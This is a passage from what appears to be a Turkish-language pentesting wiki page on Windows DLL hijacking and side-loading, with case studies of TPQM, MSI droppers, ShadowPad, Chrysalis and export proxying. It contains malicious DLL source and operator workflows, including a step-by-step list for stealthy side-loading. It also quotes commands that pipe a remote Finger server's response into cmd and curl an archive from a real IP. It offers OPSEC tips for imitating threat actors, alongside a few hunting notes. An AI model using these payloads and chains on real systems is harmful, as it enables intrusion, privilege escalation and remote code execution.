- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir; bu da local user’ların arbitrary files bırakmasına izin verir.
- **DLL Search Behavior**: Önce working directory’sinden `hostfxr.dll` yüklemeyi dener ve dosya yoksa "NAME NOT FOUND" loglar; bu da local directory search önceliğini gösterir.

### Exploit Implementation

Bir attacker, aynı dizine malicious bir `hostfxr.dll` stub yerleştirerek eksik DLL’i kullanıp user context altında code execution elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` içine bırakın.
2. Scheduled task’ın geçerli kullanıcının context’i altında saat 9:30 AM’de çalışmasını bekleyin.
3. Task çalıştığında bir administrator oturum açmışsa, malicious DLL administrator’ın session’ında medium integrity ile çalışır.
4. Medium integrity’den SYSTEM privileges’a yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors, payload’ları trusted, signed bir process altında çalıştırmak için sık sık MSI tabanlı droppers ile DLL side-loading’i birlikte kullanır.

Chain overview
- User MSI’yi indirir. Bir CustomAction, GUI install sırasında sessizce çalışır (ör. LaunchApplication veya bir VBScript action) ve gömülü resources içinden sonraki aşamayı yeniden oluşturur.
- Dropper, legitimate, signed bir EXE ve malicious bir DLL’i aynı dizine yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Signed EXE başlatıldığında, Windows DLL search order önce working directory içindeki wsc.dll’yi yükler ve attacker code’u signed parent altında çalıştırır (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Executable veya VBScript çalıştıran girdilere bakın. Şüpheli örnek pattern: LaunchApplication ile gömülü bir dosyanın background’da çalıştırılması.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından birleştirilip decrypt edilen birden fazla küçük fragment arayın. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: meşru imzalı host (Avast). Process, kendi dizininden adıyla wsc.dll yüklemeye çalışır.
- wsc.dll: attacker DLL. Belirli exportlar gerekmiyorsa, DllMain yeterli olabilir; aksi halde, bir proxy DLL oluşturun ve required exports’u gerçek library’ye forward ederken payload’ı DllMain içinde çalıştırın.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export requirements için, payload’inizi de çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (örn. DLLirant/Spartacus) kullanın.

- Bu teknik, host binary tarafından DLL name resolution’a dayanır. Host absolute path’ler veya safe loading flags (örn. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa, hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports önceliği etkileyebilir ve host binary ile export set seçimi sırasında dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon’ın ShadowPad’i meşru yazılıma benzer şekilde gizlenirken çekirdek payload’i disk üzerinde encrypted tutmak için **üç dosyalı triad** kullandığını anlattı:

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor’lar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers executable’ı bir Windows binary’si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerli kalır.
2. **Malicious loader DLL** – EXE’nin yanına beklenen bir isimle bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework ile obfuscate edilmiş bir MFC binary’sidir; tek görevi encrypted blob’u bulmak, decrypt etmek ve ShadowPad’i reflectively map etmektir.
3. **Encrypted payload blob** – çoğu zaman aynı dizinde `<name>.tmp` olarak saklanır. Decrypted payload memory-mapping yapıldıktan sonra loader, forensic evidence’ı yok etmek için TMP dosyasını siler.

Tradecraft notları:

* Signed EXE’yi yeniden adlandırmak (PE header’daki orijinal `OriginalFileName` değerini korurken) onun bir Windows binary’si gibi görünmesini sağlar ama vendor signature’ı korur; bu yüzden Ink Dragon’ın `conhost.exe` görünümlü ama aslında AMD/NVIDIA utility olan binary’leri bırakma alışkanlığını taklit edin.
* Executable trusted kaldığı için, çoğu allowlisting control için sadece malicious DLL’nin onun yanında bulunması yeterlidir. Loader DLL’yi özelleştirmeye odaklanın; signed parent çoğu zaman değiştirilmeden çalışabilir.
* ShadowPad decryptor, TMP blob’un loader’ın yanında ve yazılabilir olmasını bekler ki mapping sonrası dosyayı zero’layabilsin. Payload yüklenene kadar dizini writable tutun; memory’deyken TMP dosyası OPSEC için güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, DLL sideloading’i LOLBAS ile eşleştirir; böylece disk üzerindeki tek custom artifact, trusted EXE’nin yanındaki malicious DLL olur:

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` başlatır, Finger server’ından komutları çeker ve bunları `cmd`’ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`, TCP/79 text çeker; `| cmd` server yanıtını çalıştırır ve operator’ların ikinci aşama server’ını server tarafında döndürmesine izin verir.

- **Built-in download/extract:** Bir archive’ı benign extension ile indirir, açar ve sideload target ile DLL’i rastgele bir `%LocalAppData%` klasörü altında stage eder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ilerlemeyi gizler ve redirects’i takip eder; `tar -xf` Windows’un yerleşik tar’ını kullanır.

- **WMI/CIM launch:** EXE’yi WMI üzerinden başlatır; böylece telemetry, colocated DLL yüklenirken bir CIM-created process gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL’leri tercih eden binary’lerle çalışır (örn. `intelbq.exe`, `nearby_share.exe`); payload (örn. Remcos) trusted name altında çalışır.

- **Hunting:** `forfiles` için `/p`, `/m` ve `/c` birlikte göründüğünde alert üretin; admin script’leri dışında nadirdir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion, DLL sideload + tamamen in-memory payloads içeren bir NSIS-packed dropper teslim etmek için trusted bir update chain’i kötüye kullandı.

Tradecraft flow
- `update.exe` (NSIS), `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` ve encrypted blob `BluetoothService` bırakır, ardından EXE’yi başlatır.
- Host EXE, `log.dll` import eder ve `LogInit`/`LogWrite` çağırır. `LogInit` blob’u mmap-load eder; `LogWrite` onu **0x19660D** / **0x3C6EF35F** sabitlerini kullanan custom LCG tabanlı bir stream ile decrypt eder, ana shellcode’u plaintext ile buffer üzerine yazar, geçici verileri serbest bırakır ve ona jump eder.
- Bir IAT’ten kaçınmak için loader, export isimlerini **FNV-1a basis 0x811C9DC5 + prime 0x1000193** ile hash’leyerek çözer, ardından Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve salted target hash’lerle karşılaştırır.

Main shellcode (Chrysalis)
- `gQ2JR&9;` key’ini beş pass boyunca add/XOR/sub tekrar ederek PE-benzeri ana module’ü decrypt eder, sonra import resolution’ı tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress` yükler.
- Per-character bit-rotate/XOR transforms ile runtime’da DLL name string’lerini yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- **PEB → InMemoryOrderModuleList** üzerinde dolaşan ikinci bir resolver kullanır, her export table’ı 4-byte bloklar halinde Murmur tarzı mixing ile parse eder ve hash bulunmazsa yalnızca `GetProcAddress`’e geri döner.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` dosyasının içinde **offset 0x30808**’de (size **0x980**) bulunur ve `qwhvb^435h&*7` key’i ile RC4-decrypt edilir; böylece C2 URL ve User-Agent ortaya çıkar.
- Beacons, nokta ile ayrılmış bir host profile oluşturur, `4Q` tag’ini öne ekler, ardından HTTPS üzerinden `HttpSendRequestA` öncesi `vAuig34%^325hGV` key’i ile RC4-encrypt eder. Responses RC4-decrypt edilir ve bir tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode CLI args ile gate edilir: args yoksa `-i`’ye işaret eden persistence (service/Run key) kurulur; `-i` self’i `-k` ile yeniden başlatır; `-k` install’i atlar ve payload’i çalıştırır.

Alternate loader observed
- Aynı intrusion, Tiny C Compiler bıraktı ve `C:\ProgramData\USOShared\` içinden, yanında `libtcc.dll` ile birlikte `svchost.exe -nostdlib -run conf.c` çalıştırdı. Saldırgan tarafından sağlanan C source, shellcode’u embedded etti, compile etti ve disk’e bir PE dokunmadan in-memory olarak çalıştırdı. Şununla taklit edin:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC tabanlı compile-and-run aşaması, `Wininet.dll` dosyasını runtime sırasında import etti ve hardcoded bir URL’den ikinci aşama shellcode çekti; böylece bir compiler çalışması gibi davranan esnek bir loader sağladı.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, meşru host’un canlı kalması için **stability engineering** ekler; böylece malicious DLL yüklendikten sonra çökmeden, sonraki aşamalar düzgün şekilde yüklenebilir.

Gözlemlenen desen
- Güvenilir bir EXE’yi, `version.dll` gibi beklenen dependency adıyla malicious bir DLL’in yanına bırak.
- Malicious DLL, beklenen tüm export’ları gerçek sistem DLL’ine (örneğin `%SystemRoot%\\System32\\version.dll`) **proxy** eder; böylece import resolution yine başarılı olur ve host process çalışmaya devam eder.
- Yüklemeden sonra, malicious DLL **host entry point**’ini patch’ler; böylece main thread çıkmak ya da process’i sonlandıracak code path’leri çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girer.
- Yeni bir thread gerçek malicious işi yapar: sonraki aşama DLL adını veya path’ini decrypt eder (RC4/XOR yaygındır), ardından `LoadLibrary` ile onu başlatır.

Bu neden önemli
- Normal DLL proxying API compatibility’yi korur, ama host’un sonraki aşamalar için yeterince uzun süre canlı kalacağını garanti etmez.
- Main thread’i `Sleep(INFINITE)` içinde park etmek, signed process’i resident halde tutmanın basit bir yoludur; loader bu sırada worker thread içinde decryption, staging veya network bootstrap yapar.
- Sadece şüpheli bir `DllMain` aramak bu deseni kaçırabilir; çünkü ilginç davranış host entry point patch’lendikten ve ikincil bir thread başladıktan sonra gerçekleşir.

Minimal workflow
1. Signed host EXE’yi kopyala ve local directory’den hangi DLL’i resolve ettiğini belirle.
2. Aynı fonksiyonları export eden ve bunları meşru DLL’e forward eden bir proxy DLL oluştur.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluştur.
4. Bu thread’den host entry point’i veya main thread start routine’ini patch’leyerek `Sleep` üzerinde dönen bir döngüye sok.
5. Next-stage DLL adını/config’ini decrypt et ve `LoadLibrary` çağır veya payload’ı manual-map et.

Defensive pivots
- Signed process’lerin `System32` yerine kendi application directory’lerinden `version.dll` ya da benzer yaygın kütüphaneleri yüklemesi.
- Image load’dan kısa süre sonra process entry point’inde yapılan memory patch’ler, özellikle `Sleep`/`SleepEx`’e yönlendirilen jump/call’ler.
- Proxy DLL tarafından oluşturulan ve hemen ikinci bir DLL üzerinde decrypted bir ad ile `LoadLibrary` çağıran thread’ler.
- Vendor executable’larının yanına, `ProgramData`, `%TEMP%` veya unpack edilmiş archive path’leri gibi writable staging directory’lerinde yerleştirilen full-export proxy DLL’ler.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
